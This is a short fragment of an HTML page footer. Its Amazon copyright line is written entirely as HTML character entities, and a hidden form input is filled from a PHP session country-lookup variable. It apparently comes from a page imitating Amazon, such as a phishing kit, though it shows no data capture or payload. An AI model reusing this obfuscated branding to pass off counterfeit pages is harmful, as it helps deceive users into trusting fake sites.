                  &#xA9;&#x20;&#x31;&#x39;&#x39;&#x36;&#x2D;&#x32;&#x30;&#x31;&#x38;&#x2C;&#x20;&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x2E;&#x63;&#x6F;&#x6D;&#x2C;&#x20;&#x49;&#x6E;&#x63;&#x2E;&#x20;&#x6F;&#x72;&#x20;&#x69;&#x74;&#x73;&#x20;&#x61;&#x66;&#x66;&#x69;&#x6C;&#x69;&#x61;&#x74;&#x65;&#x73;
                  </span>
               </div>
            </div>
         </div>
      </div>
      </div>
   </body>
   <input type="hidden" name="country_form" id="country_form" value="<?=$_SESSION['_LOOKUP_CNTRCODE_'];?>">
</html>